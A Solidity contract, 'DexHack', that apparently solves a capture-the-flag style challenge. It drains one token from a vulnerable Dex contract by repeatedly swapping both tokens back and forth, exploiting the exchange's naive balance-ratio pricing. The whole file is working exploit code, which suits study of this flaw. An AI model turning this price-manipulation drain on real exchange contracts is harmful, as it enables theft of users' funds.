// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;
import "./Dex.sol";

contract DexHack {
    Dex dex;
    constructor(Dex _dex) {
        dex = _dex;
    }

    function attack() external {
        // adds 2 addresses for 2 tokens
        address[2] memory tokens = [dex.token1(), dex.token2()];
        
        // approve the contract for all tokens with openzeppelin
        SwappableToken(tokens[0]).approve(address(dex), type(uint256).max);
        SwappableToken(tokens[1]).approve(address(dex), type(uint256).max);

        uint[2] memory hackBalances;
        uint[2] memory dexBalances;
        uint fromIndex = 0;
        uint toIndex = 1;
        while(true){
            // if token swaps are true, then record balances
            hackBalances = [ SwappableToken(tokens[fromIndex]).balanceOf(address(this)), 
                             SwappableToken(tokens[  toIndex]).balanceOf(address(this))];

            dexBalances = [SwappableToken(tokens[fromIndex]).balanceOf(address(dex)), 
                           SwappableToken(tokens[  toIndex]).balanceOf(address(dex))];

            uint swapPrice = dex.get_swap_price(tokens[fromIndex], tokens[toIndex], hackBalances[0]); 
            // if swap price greater than dex balances, then terminate, otherwise proceed with the swap if both are equal
            if(swapPrice > dexBalances[1]) {
                dex.swap(tokens[fromIndex], tokens[toIndex], dexBalances[0]);
                break;
            }else {
                dex.swap(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
            }
            // reverse indexes
            fromIndex = 1 - fromIndex;
            toIndex = 1 - toIndex;
        } 
    }
}
